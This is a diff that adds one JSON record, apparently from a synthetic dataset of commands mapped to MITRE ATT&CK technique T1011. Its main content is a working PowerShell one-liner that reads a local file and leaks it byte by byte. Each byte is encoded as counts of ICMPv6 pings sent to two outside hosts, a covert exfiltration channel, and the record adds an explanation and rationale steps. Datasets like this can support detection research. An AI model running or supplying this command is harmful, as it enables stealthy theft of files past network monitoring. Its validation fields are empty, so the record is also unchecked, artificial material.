@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$d1='fd00:3333::a'; $d2='fd00:3333::b'; $bytes=[IO.File]::ReadAllBytes('C:\\Users\\Public\\report.bin'); foreach($b in $bytes){ $hi=($b -shr 4); $lo=($b -band 0x0F); Test-Connection -ComputerName $d1 -Count (2 + $hi) -IPv6 -Quiet | Out-Null; Start-Sleep -Milliseconds 150; Test-Connection -ComputerName $d2 -Count (2 + $lo) -IPv6 -Quiet | Out-Null }",
+  "explanation": "Encodes nibbles into the number of ICMPv6 echos (-Count) sent to two destinations, a covert channel over ICMPv6 under T1011.",
+  "rationale_steps": [
+    "Derive high/low nibbles from each byte.",
+    "Transmit small bursts where the burst length encodes the nibble.",
+    "Space bursts with a short sleep to delineate values for the receiver."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-f38205c7-a32fe73c",
+  "source_prompt_hash": "f38205c7",
+  "timestamp_utc": "2025-09-30T08:38:57.416507Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
